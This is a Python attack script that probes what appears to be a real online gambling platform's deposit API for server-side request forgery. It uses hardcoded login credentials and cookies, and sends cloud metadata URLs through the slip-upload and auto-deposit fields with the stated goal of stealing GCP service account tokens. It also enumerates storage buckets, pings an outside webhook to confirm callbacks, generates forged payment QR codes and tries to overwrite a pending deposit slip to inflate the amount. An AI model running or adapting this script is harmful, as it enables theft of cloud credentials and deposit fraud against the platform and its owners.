#!/usr/bin/env python3
"""probe_ssrf.py — Test SSRF via upload-slip filename field.

   FINDING from probe_signurl: upload-slip accepts arbitrary URLs as filename.
   If the platform fetches slip_image_url for OCR/matching:
   - http://169.254.169.254/ → GCP metadata (service account tokens)
   - http://metadata.google.internal/ → same, via internal DNS
   - https://storage.googleapis.com/pcdn.i-gamingplatform.com/ → enumerate bucket
   - Also: try slip_image_url directly in auto-slip-deposit (bypass upload-slip)

   Goal: exfiltrate GCP service account token or enumerate internal endpoints.
"""
import base64, json, pathlib, requests, time

TID    = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI  = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"
BANK_INFO = "18a9502b-94ae-4188-8841-094be8b3b974"
DEP_ACCT  = "00b6996c-0e41-4b56-9fa7-94f77f4fd717"

JWT_FILE = pathlib.Path(".jwt.vak88z2")

def get_jwt():
    cached = JWT_FILE.read_text().strip() if JWT_FILE.exists() else ""
    if cached:
        p = json.loads(base64.urlsafe_b64decode(cached.split(".")[1] + "=="))
        if p.get("exp", 0) - time.time() > 300:
            return cached
    r = requests.post(f"{PBAPI}/pb/authentication",
        headers={"Content-Type": "application/json"},
        json={"strategy": "local", "username": "0972571110", "password": "Pwned2026!"},
        timeout=15)
    if r.status_code in (200, 201):
        jwt = r.json()["accessToken"]
        JWT_FILE.write_text(jwt)
        return jwt
    raise RuntimeError(f"Auth: {r.status_code}")

JWT = get_jwt()
HDR = {"Authorization": f"Bearer {JWT}", "template": "vn",
       "Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}"}

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    return r.json().get("data", [{}])[0].get("balance", "?") if r.ok else f"ERR:{r.status_code}"

print(f"wallet: {wallet()}\n")

# ── 1. upload-slip with metadata URL → then check upload-slip url field ──────
print("=== 1. upload-slip SSRF — full response for external filenames ===")
ssrf_targets = [
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://169.254.169.254/latest/meta-data/",  # AWS-style
    # Public webhook for SSRF confirmation
    "https://webhook.site/unique-token-for-test",
]
for target in ssrf_targets:
    r = requests.post(f"{MGAPI}/mb/upload-slip", headers=HDR,
                      json={"filename": target,
                            "fileOriginalName": "slip.png",
                            "contentType": "image/jpeg",
                            "size": 680284},
                      timeout=15)
    if r.ok:
        body = r.json()
        print(f"  target: {target[:60]}")
        print(f"    file_name: {body.get('file_name', '')[:80]}")
        print(f"    url: {body.get('url', '')[:120]}")
    else:
        print(f"  {target[:60]} → {r.status_code}: {r.text[:100]}")
    time.sleep(0.5)

# ── 2. auto-slip-deposit with SSRF URL directly as slip_image_url ─────────────
print("\n=== 2. auto-slip-deposit with metadata URL as slip_image_url ===")
# Use a real QR that hasn't been used yet (generate fresh one)
import sys
sys.path.insert(0, "nuxt")
from slipgen3 import generate_tx_reference, generate_qr_data, calculate_qr_crc
from datetime import datetime, timezone, timedelta

# Generate a fresh QR
now = datetime.now(timezone.utc) + timedelta(hours=7)
tx_ref = generate_tx_reference(now)
fresh_qr = generate_qr_data(tx_ref)
print(f"  Fresh QR: {fresh_qr} (tx_ref={tx_ref})")

ssrf_image_targets = [
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/computeMetadata/v1/project/project-id",
]
for target in ssrf_image_targets:
    # First register via upload-slip
    usl = requests.post(f"{MGAPI}/mb/upload-slip", headers=HDR,
                        json={"filename": target, "fileOriginalName": "slip.png",
                              "contentType": "image/jpeg", "size": 680284},
                        timeout=15)
    if not usl.ok:
        print(f"  upload-slip failed: {usl.status_code}")
        continue
    stored_fn = usl.json().get("file_name", target)

    # Now deposit pointing to the SSRF filename
    dep = requests.post(f"{MGAPI}/mb/auto-slip-deposit", headers=HDR,
                        json={"payment_bank_information_id": BANK_INFO,
                              "deposit_amount": 500,
                              "note": "$",
                              "deposit_account_id": DEP_ACCT,
                              "slip_image_url": stored_fn,
                              "qr_string": fresh_qr},
                        timeout=30)
    print(f"\n  slip_image_url={target[:60]}")
    print(f"  auto-slip-deposit: HTTP {dep.status_code}")
    print(f"  Response: {dep.text[:400]}")
    time.sleep(2)

# ── 3. Try slip_image_url as direct GCP metadata (no upload-slip) ─────────────
print("\n=== 3. Direct SSRF in slip_image_url without upload-slip ===")
now2 = datetime.now(timezone.utc) + timedelta(hours=7, seconds=60)
qr2 = generate_qr_data(generate_tx_reference(now2))

for url_target in [
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
    "http://169.254.169.254/computeMetadata/v1/instance/hostname",
    "http://169.254.169.254/",
]:
    dep = requests.post(f"{MGAPI}/mb/auto-slip-deposit", headers=HDR,
                        json={"payment_bank_information_id": BANK_INFO,
                              "deposit_amount": 500,
                              "note": "$",
                              "deposit_account_id": DEP_ACCT,
                              "slip_image_url": url_target,
                              "qr_string": qr2},
                        timeout=30)
    print(f"  slip_image_url={url_target[:60]}")
    print(f"    HTTP {dep.status_code}: {dep.text[:300]}")
    time.sleep(2)

# ── 4. Check pcdn.i-gamingplatform.com bucket listing ─────────────────────────
print("\n=== 4. GCS bucket enumeration via SSRF ===")
bucket_urls = [
    f"https://storage.googleapis.com/pcdn.i-gamingplatform.com/{TID}/deposit_slip/",
    f"https://storage.googleapis.com/pcdn.i-gamingplatform.com/",
    "https://storage.googleapis.com/luxino-public/",
]
for burl in bucket_urls:
    usl = requests.post(f"{MGAPI}/mb/upload-slip", headers=HDR,
                        json={"filename": burl, "fileOriginalName": "enum.png",
                              "contentType": "image/jpeg", "size": 100},
                        timeout=15)
    print(f"  {burl[:60]}: HTTP {usl.status_code}: {usl.text[:150]}")

# ── 5. Overwrite queued deposit slip (inflate amount visual) ──────────────────
print("\n=== 5. Find queued deposit and overwrite slip image ===")
# Check if any deposit is pending (from our earlier 500 THB submission)
# The deposit transaction endpoint to check status
for path in ["/mb/deposit-transaction", "/mb/deposit-history", "/mb/transaction"]:
    r = requests.get(f"{MGAPI}{path}", headers=HDR,
                     params={"skip": 0, "limit": 10, "domain": "m.vak88z2.com"},
                     timeout=10)
    if r.status_code not in (404,):
        print(f"  [!!!] GET {path}: HTTP {r.status_code}: {r.text[:300]}")
    else:
        print(f"  GET {path}: 404")

time.sleep(3)
print(f"\nFINAL wallet: {wallet()}")
